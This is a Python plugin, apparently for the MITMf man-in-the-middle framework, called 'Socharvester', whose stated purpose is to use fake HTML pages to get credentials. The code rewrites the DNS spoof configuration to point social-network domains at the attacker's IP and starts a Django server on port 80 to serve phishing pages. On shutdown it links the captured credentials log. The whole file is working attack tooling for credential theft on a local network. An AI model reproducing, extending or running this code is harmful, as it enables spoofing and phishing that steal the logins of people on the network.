import sys
import os
import logging
import argparse
from subprocess import call, Popen, PIPE

from core.configwatcher import ConfigWatcher
from core.logger import logger
from plugins.plugin import Plugin

class Socharvester(Plugin):
    name        = "Socharvester"
    optname     = "socharvester"
    tree_info   = []
    desc        = "Experimental socharvester plugin. Use fake html pages to get creds. " \
                  "May need --dns and (or) --arp options to work properly"
    version     = "0.1 (alpha)"

    def __change_config(self):
        # we need to change DNS spoof settings
        # move code from dns_configure (socharvester project)

        sys.path.append(os.path.join(self.harvester_path, "project"))
        try:
            import settings
        except:
            self.log.error("cannot import socharvester's settings!")
            sys.exit(1)

        conf = open(self.options.configfile, 'rt').read()
        p_before = conf[ : conf.find('[[[A]]]') + 7 ] + '\n'
        p_after = '\t'*2 + conf[conf.find('[[[AAAA]]'): ]
        dns_conf = ''
        for r in settings.RESOURCES:
            dns_conf += '\t\t%s=%s\n' % (r, self.options.ip)

        fd_out = open(self.options.configfile, 'wt')

        fd_out.write(p_before)
        fd_out.write("%s\n" % dns_conf)
        fd_out.write(p_after)
        fd_out.close()

        self.tree_info.append("mitmf config changed")

    def __start_server(self):
        manage = os.path.join(self.harvester_path, "manage.py")
        call("%s %s migrate > /dev/null" % (sys.executable, manage), shell=True)
        self.p_runserver = Popen("%s %s runserver 0.0.0.0:80" % (sys.executable, manage), shell=True)
        self.tree_info.append("server started successfully. "
                              "see creds at %s" % self.harvester_log)

    def __init__(self, parser):
        if self.desc:
            sgroup = parser.add_argument_group(self.name, self.desc)
        else:
            sgroup = parser.add_argument_group(self.name,"Options for the '{}' plugin".format(self.name))

        sgroup.add_argument("--{}".format(self.optname), action="store_true",help="Load plugin '{}'".format(self.name))

        self.options(sgroup)

    def initialize(self, options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options

        self.harvester_path = self.config["MITMf"]["Socharvester"]["path"]
        self.harvester_log = 'logs/socharvester.log'

        # check project exists
        if not os.path.exists(self.harvester_path):
            self.log.error("socharvester not found at %s" % self.harvester_path)
            sys.exit(1)

        # TODO: stop mobile apps for social networks (drop requests to some hosts for example)
        # TODO: inject fake login forms in dns spoof not working
        self.__change_config()
        self.__start_server()

    # def request(self, request):
    #     '''
    #         Handles all outgoing requests, hooks connectionMade()
    #         request object has the following attributes:
    #
    #         request.headers => headers in dict format
    #         request.commad  => HTTP method
    #         request.post    => POST data
    #         request.uri     => full URL
    #         request.path    => path
    #     '''
    #     pass

    def response(self, response, request, data):
        '''
            Handles all non-image responses by default, hooks handleResponse() (See Upsidedownternet for how to get images)
        '''
        return {'response': response, 'request':request, 'data': data}

    def options(self, options):
        pass

    def on_shutdown(self):
        harvester_log_link = os.path.join(self.harvester_path, 'creds.log')
        if not os.path.exists(self.harvester_log):
            call("ln %s %s" % (harvester_log_link, self.harvester_log), shell=True)
            self.log.info("harvester log link: %s" % harvester_log_link)
        self.p_runserver.kill()
